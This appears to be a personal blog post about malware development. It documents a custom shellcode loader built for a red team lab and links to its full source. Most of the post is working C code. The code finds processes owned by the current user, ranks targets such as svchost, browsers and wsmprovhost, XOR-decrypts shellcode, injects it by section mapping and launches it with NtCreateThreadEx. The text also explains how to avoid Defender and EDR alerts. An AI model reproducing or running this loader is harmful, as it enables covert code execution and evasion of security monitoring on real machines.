---
title: ShivaInjector
date: 2025-08-10
categories: [Maldev, C/C++, Windows]
tags: [insane, active directory, cloud, malware development]
description: Process of building a section mapping injection loader to use in Vulnlab's Shiva RTL.
image:
  path: ../assets/img/maldev/shivainjector/image.png
---
For Vulnlab's *Shiva*, the last red team lab (RTL) I have left, I decided to create another custom shellcode loader.
This has become a bit of a tradition for me. For each previous RTL, I threw together a dedicated loader.

The loaders for *Shinra* and *Ifrit* are already on my GitHub. Though for *Wutai* I modified my SimpleShellcodeLoader project by removing the option of loading shellcode directly from disk, since that approach is now detected by Defender without modification.

### The Problem
---
When I built **Samoflange**, which uses thread hijacking to detonate its payload, I found it unreliable in certain environments.
The same applies to several other thread-based methods, such as Waiting Thread Hijacking. They work in some cases but not in others, and that unpredictability is not ideal during an engagement.

Also, by spawning processes like `RuntimeBroker` and `SvcHost` we increase our odds of detection as the parent process will be like `cmd`, `powershell`, or `wsmprovhost`. All three of those have their child processes monitored, which sets off alerts.

Obviously we don't want to be detected, so that limits our options. We could target an `SvcHost` that's running on the system, then spoof the parent PPID. But if we connect with `WinRM` and the user isn't already active on the machine `wsmprovhost` is the only process that we can create a child to or inject into. Also, spawning a new process is noisy in itself.

So the plan is to create a loader that will search for processes that can be injected into, rank by the freedoms those processes reguarly have, map a section into the best process, and then create a thread in that triggers the payload.

### A Simple First Step
---
In PowerShell it's easy to get a list of processes that belong to the current user, and most of these are suitable injection targets:

```powershell
# Processes running as the current user:
Get-Process | Where-Object { $_.StartInfo.Environment["USERNAME"] -eq $env:USERNAME } | Select ProcessName, Id

# Using WMI:
Get-WmiObject Win32_Process | Where-Object { $_.GetOwner().User -eq $env:USERNAME } |  Select Name, ProcessID
```
We could pass one of the PIDs returned to the loader.

But what if PowerShell is not available?
Doing the same thing in C, without relying on higher-level Windows API calls, is much more difficult.

Lets break the process down into clear steps. We will look at how to:

* Identify the current user's SID
* Enumerate all processes
* Filter only those owned by the current user
* Select a suitable candidate for injection

## Finding a Friendly Process to Inject Into
---
When you’re building tooling that needs to inject inside another process, you can’t just blindly open *any* process you see on the system.

* You might not have permissions.
* You could trigger security software.
* You could crash something critical.

The safe bet? Stick to processes that belong to your own user account, ones that you own and have permission to touch.

The code we’re going to look at does exactly that. It’s split into four main parts:

### Step 1: Figuring Out Who "You" Are
---
```c
static BOOL GetCurrentUserSID(INSTANCE Instance, PSID* ppSid) {
    HANDLE hToken = NULL;
    // use pseudo-handle for current process: (HANDLE)-1
    NTSTATUS status = Instance.Api.NtOpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken);
    if (!NT_SUCCESS(status)) return FALSE;

    ULONG need = 0;
    // First query to get required size
    status = Instance.Api.NtQueryInformationToken(hToken, TokenUser, NULL, 0, &need);
    if (status != STATUS_BUFFER_TOO_SMALL && status != STATUS_INVALID_PARAMETER) {
        // on some Windows variants the call returns STATUS_BUFFER_TOO_SMALL; treat other as error
        Instance.Api.NtClose(hToken);
        return FALSE;
    }

    PTOKEN_USER ptu = (PTOKEN_USER)malloc(need);
    if (!ptu) { Instance.Api.NtClose(hToken); return FALSE; }

    status = Instance.Api.NtQueryInformationToken(hToken, TokenUser, ptu, need, &need);
    if (!NT_SUCCESS(status)) {
        free(ptu);
        Instance.Api.NtClose(hToken);
        return FALSE;
    }

    DWORD sidLen = GetLengthSid(ptu->User.Sid);
    PSID sidCopy = malloc(sidLen);
    if (!sidCopy) {
        free(ptu);
        Instance.Api.NtClose(hToken);
        return FALSE;
    }
    memcpy(sidCopy, ptu->User.Sid, sidLen);

    free(ptu);
    Instance.Api.NtClose(hToken);

    *ppSid = sidCopy;
    return TRUE;
}
```

Every user account in Windows is identified internally by a **Security Identifier** (SID).
It’s like your account’s passport number; unique to you.

Here’s the flow:
1. **Open your own process token** - the small data structure Windows keeps with your login details.
2. **Ask how big the “TokenUser” data is** (two-step dance because NT APIs often require you to check size first).
3. **Grab the SID** from that token.
4. **Make a private copy** so it stays valid after we close the token.

At the end, we know:

> “This is me: SID `S-1-5-21-…`”

### Step 2: Asking “Does This Process Belong to Me?”
---
```c
static BOOL IsProcessOwnedByUser(INSTANCE Instance, DWORD pid, PSID currentSid) {
    HANDLE hProcess = NULL;
    CLIENT_ID cid{};
    cid.UniqueProcess = (PVOID)(ULONG_PTR)pid;
    cid.UniqueThread = NULL;

    OBJECT_ATTRIBUTES oa{};
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

    NTSTATUS status = Instance.Api.NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid);
    if (!NT_SUCCESS(status) || hProcess == NULL) {
        // couldn't open -> treat as not-owned
        return FALSE;
    }

    // Open the token for the process
    HANDLE hToken = NULL;
    status = Instance.Api.NtOpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
    if (!NT_SUCCESS(status) || !hToken) {
        Instance.Api.NtClose(hProcess);
        return FALSE;
    }

    // Query TokenUser size
    ULONG need = 0;
    status = Instance.Api.NtQueryInformationToken(hToken, TokenUser, NULL, 0, &need);
    if (status != STATUS_BUFFER_TOO_SMALL && status != STATUS_INVALID_PARAMETER) {
        Instance.Api.NtClose(hToken);
        Instance.Api.NtClose(hProcess);
        return FALSE;
    }

    PTOKEN_USER ptu = (PTOKEN_USER)malloc(need);
    if (!ptu) {
        Instance.Api.NtClose(hToken);
        Instance.Api.NtClose(hProcess);
        return FALSE;
    }

    status = Instance.Api.NtQueryInformationToken(hToken, TokenUser, ptu, need, &need);
    if (!NT_SUCCESS(status)) {
        free(ptu);
        Instance.Api.NtClose(hToken);
        Instance.Api.NtClose(hProcess);
        return FALSE;
    }

    BOOL match = CheckEqualSid(currentSid, ptu->User.Sid) ? TRUE : FALSE;

    free(ptu);
    Instance.Api.NtClose(hToken);
    Instance.Api.NtClose(hProcess);
    return match;
}
```

For each process we might look at, we:
1. Open the process (read-only, minimal privileges).
2. Open *its* token.
3. Get the owner SID from that token.
4. Compare it with *our* SID from Step 1.

If they match -> it’s ours.
If not -> ignore it.

This keeps us from touching processes owned by `SYSTEM`, other users, or services.

### Step 3: Getting the List of All Our Processes
---
```c
int EnumerateProcessesForCurrentUser(INSTANCE Instance, PF_PROCESS_ENTRY** outList) {
    PSID currentSid = NULL;
    if (!GetCurrentUserSID(Instance, &currentSid)) return 0;

    ULONG bufSize = 1 << 16; // 64KB start
    PVOID buffer = NULL;
    NTSTATUS status;
    ULONG returnLen = 0;

    // grow until success
    for (;;) {
        if (buffer) { Instance.Api.RtlFreeHeap(NtGetCurrentHeap(), 0, buffer); buffer = NULL; }
        buffer = Instance.Api.RtlAllocateHeap(NtGetCurrentHeap(), HEAP_ZERO_MEMORY, bufSize);
        if (!buffer) { free(currentSid); return 0; }

        status = Instance.Api.NtQuerySystemInformation(SystemProcessInformation, buffer, bufSize, &returnLen);
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            bufSize *= 2;
            continue;
        }
        if (!NT_SUCCESS(status)) {
            Instance.Api.RtlFreeHeap(NtGetCurrentHeap(), 0, buffer);
            free(currentSid);
            return 0;
        }
        break;
    }

    PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)buffer;
    size_t capacity = PF_INITIAL_CAP;
    PF_PROCESS_ENTRY* list = (PF_PROCESS_ENTRY*)malloc(capacity * sizeof(PF_PROCESS_ENTRY));
    if (!list) { Instance.Api.RtlFreeHeap(NtGetCurrentHeap(), 0, buffer); free(currentSid); return 0; }
    size_t count = 0;

    while (TRUE) {
        if (spi->UniqueProcessId != 0) {
            DWORD pid = (DWORD)(ULONG_PTR)spi->UniqueProcessId;
            // check owner
            if (IsProcessOwnedByUser(Instance, pid, currentSid)) {
                if (count >= capacity) {
                    size_t nc = capacity * 2;
                    PF_PROCESS_ENTRY* tmp = (PF_PROCESS_ENTRY*)realloc(list, nc * sizeof(PF_PROCESS_ENTRY));
                    if (!tmp) break;
                    list = tmp;
                    capacity = nc;
                }
                list[count].pid = pid;
                if (spi->ImageName.Buffer && spi->ImageName.Length) {
                    // ImageName.Length is bytes
                    int nchars = (int)(spi->ImageName.Length / sizeof(WCHAR));
                    int tocopy = (nchars < (PF_NAME_LEN - 1)) ? nchars : (PF_NAME_LEN - 1);
                    wcsncpy_s(list[count].name, PF_NAME_LEN, spi->ImageName.Buffer, tocopy);
                    list[count].name[tocopy] = L'\0';
                }
                else {
                    // fallback
                    wcsncpy_s(list[count].name, PF_NAME_LEN, L"(unknown)", _TRUNCATE);
                }
                count++;
            }
        }

        if (spi->NextEntryOffset == 0) break;
        spi = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)spi + spi->NextEntryOffset);
    }

    Instance.Api.RtlFreeHeap(NtGetCurrentHeap(), 0, buffer);
    free(currentSid);

    *outList = list;
    return (int)count;
}
```

Now the fun part: **system-wide process inventory**.

We call `NtQuerySystemInformation(SystemProcessInformation)`, a low-level NT API that returns a giant linked list of every process in the system.

The code:
* Starts with a 64KB buffer.
* If the data doesn’t fit (`STATUS_INFO_LENGTH_MISMATCH`), it doubles the buffer and tries again.
* Walks the process list one entry at a time.
* For each PID, calls **IsProcessOwnedByUser** to see if we own it.
* Saves matching processes’ names and IDs into our result list.

At the end, we have something like:
```
[  PID: 1234  Name: notepad.exe
   PID: 5678  Name: calc.exe
   PID: 4321  Name: myapp.exe ]
```

All owned by us, and potential injection targets.

### Step 4: Picking a Good Injection Target
---
```c
HANDLE FindInjectableProcess(INSTANCE Instance, DWORD* outPid, const WCHAR* preferred[], int preferredCount) {
    PF_PROCESS_ENTRY* list = NULL;
    int count = EnumerateProcessesForCurrentUser(Instance, &list);
    if (count <= 0) {
        if (list) free(list);
        return NULL;
    }

    HANDLE hResult = NULL;
    OBJECT_ATTRIBUTES oa{};
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

    for (int i = 0; i < count && !hResult; i++) {
        for (int p = 0; p < preferredCount && !hResult; p++) {
            if (_wcsicmp(list[i].name, preferred[p]) == 0) {
                CLIENT_ID cid;
                cid.UniqueProcess = (PVOID)(ULONG_PTR)list[i].pid;
                cid.UniqueThread = NULL;
                HANDLE hProcess = NULL;
                NTSTATUS status = Instance.Api.NtOpenProcess(&hProcess, INJECTION_DESIRED_ACCESS, &oa, &cid);
                if (NT_SUCCESS(status) && hProcess) {
                    // success
                    hResult = hProcess;
                    *outPid = list[i].pid;
                    break;
                }
            }
        }
    }

    free(list);
    return hResult;
}
```

From our list of owned processes, we try to match a "preferred" list:
```c
    // List of preferred targets, for sorting
    // See https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/credential_access_kerberoasting_unusual_process
    // Remember that if the process is closed by the system or user it will kill your beacon.
    const WCHAR* targets[] = {
        L"svchost.exe",
        L"MicrosoftEdge.exe",
        L"msedge.exe",
        L"MicrosoftEdgeUpdate.exe",
        L"chrome.exe",
        L"firefox.exe",
        L"RuntimeBroker.exe",
        L"wsmprovhost.exe", // The only process we can inject into if connected with winrm
        L"explorer.exe"
    };
```

For each candidate:
1. Check if the process name matches (case-insensitive).
2. Try to open it with desired access permissions, such as PROCESS_CREATE_THREAD.
3. If that works, return the handle and PID.

If nothing matches, return `NULL` - meaning no suitable process found.

### Putting It All Together
---
Here’s the high-level pipeline:

```
[ GetCurrentUserSID ]
         |
         v
[ Enumerate all processes ]
         |
         v
[ Keep only processes where SID == our SID ]
         |
         v
[ From that list, pick one from our preferred targets ]
         |
         v
[ Open with injection access -> ready to use ]
```

There's probably a much better way to do this, but it's what I ended up with.

## Mapping Shellcode Into the Target Process
---
```c
// -- MapShellcodeToTarget --
void* MapShellcodeToTarget(INSTANCE Instance, HANDLE hProc, PVOID* remoteOut, PBYTE payload, DWORD size, char* xorKey) {
    LARGE_INTEGER maxSize{};
    maxSize.QuadPart = size;
    HANDLE hSection = NULL;
    if (Instance.Api.NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != 0) return NULL;

    PVOID local = NULL; SIZE_T viewSize = 0;
    if (Instance.Api.NtMapViewOfSection(hSection, NtCurrentProcess(), &local, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE) != 0) return NULL;
    if (xorKey[0] && !XorDecrypt(payload, size, xorKey)) return NULL;
    memcpy(local, payload, size);

    PVOID remote = NULL; SIZE_T remoteSize = 0;
    if (Instance.Api.NtMapViewOfSection(hSection, hProc, &remote, 0, 0, NULL, &remoteSize, 2, 0, PAGE_EXECUTE_READ) != 0) return NULL;
    Instance.Api.NtUnmapViewOfSection(NtCurrentProcess(), local);
    *remoteOut = remote;
    return hSection;
}
```
Once we have picked a process to inject into, the next step is to actually get our payload into that process's memory.

For this loader I am using a **section mapping** technique with native NT APIs. I have found it to be both simple and reliable.

The steps look like this:

1. **Create a shared memory section**
   ```c
   LARGE_INTEGER maxSize{};
   maxSize.QuadPart = size;
   Instance.Api.NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
   ```

   A section is a chunk of memory that can be mapped into one or more processes at the same time.
   Here, we make it large enough to hold the shellcode and give it read, write, and execute permissions.

2. **Map the section into the current process for writing**
   ```c
   Instance.Api.NtMapViewOfSection(hSection, NtCurrentProcess(), &local, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
   ```

   This lets us write to the section from our own process first.
   If an XOR key is provided, we decrypt the payload in memory before copying it over:
   ```c
   if (xorKey[0] && !XorDecrypt(payload, size, xorKey)) return NULL;
   memcpy(local, payload, size);
   ```

3. **Map the same section into the target process as read-execute**
   ```c
   Instance.Api.NtMapViewOfSection(hSection, hProc, &remote, 0, 0, NULL, &remoteSize, 2, 0, PAGE_EXECUTE_READ);
   ```

   Now the target process sees the same memory content we just wrote, but with permissions set for execution.
   At this point, the shellcode is ready to run inside the target.

4. **Clean up the local mapping**
   ```c
   Instance.Api.NtUnmapViewOfSection(NtCurrentProcess(), local);
   ```

   We unmap our own copy, leaving only the remote mapping in place.

5. **Return the section handle**
   The section handle is kept so we can execute the payload.

## Executing Mapped Shellcode
---
```c
bool CreateThreadInTarget(INSTANCE Instance, HANDLE hProcess, PVOID remoteSectionAddress) {
    PVOID hRemoteThread = NULL;
    NTSTATUS status = Instance.Api.NtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteSectionAddress, NULL, FALSE, 0, 0, 0, NULL);
    if (status != 0 || hRemoteThread == NULL) {
        printf("[-] NtCreateThreadEx failed: 0x%X\n", status);
        return 1;
    }
    return 1;
}
```
And finally, we trigger the payload. While `NtCreateThreadEx` is a well known way to do this, it's also the simplest and most reliable, which fits in with the goal of this project.

### The final flow:
```
[ Download the payload ]
         |
         v
[ Find a process worth injecting into or validate a user submitted PID ]
         |
         v
[ Section map to the target process ]
         |
         v
[ Launch the payload ]
```

That's all. Maybe someday I'll learn how to write a proper post instead of whatever this is, but hopefully there's still something useful here for you.

You can find the full source on github:

https://github.com/P0142/ShivaLoader

### References:
- https://oblivion-malware.xyz/
- https://maldevacademy.com/
- https://research.checkpoint.com/2025/waiting-thread-hijacking/
